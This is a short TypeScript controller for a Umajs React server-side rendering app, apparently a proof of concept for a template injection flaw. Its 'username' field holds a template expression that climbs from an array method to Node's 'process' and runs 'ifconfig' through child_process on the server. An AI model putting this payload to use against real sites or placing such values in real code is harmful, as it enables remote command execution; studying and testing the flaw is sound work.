import { BaseController, Path } from '@umajs/core';
import { Result } from '@umajs/plugin-react-ssr';
import { Query } from '@umajs/arg-decorator';

@Path('/')
export default class Index extends BaseController {
    @Path('/asd')
    index() {
        return Result.react(
            'index',
            { title: 'umajs-react-ssr',
                username: "{{[].pop.constructor('return(process)')().mainModule.require('child_process').execSync('ifconfig').toString()}}",
                des: 'Umajs-react-ssr是由Umajs 搭配Srejs构建的轻量级，使用简单，灵活的React服务端渲染解决方案;支持ssr和csr两种模式自由切换。' },
            { cache: false, useEngine: true },
        );
    }

    @Path('/getData')
    async getData(@Query('id') id:string) {
        console.log(id);

        return Result.json({ code: 0, data: [1, 2, 3] });
    }
}
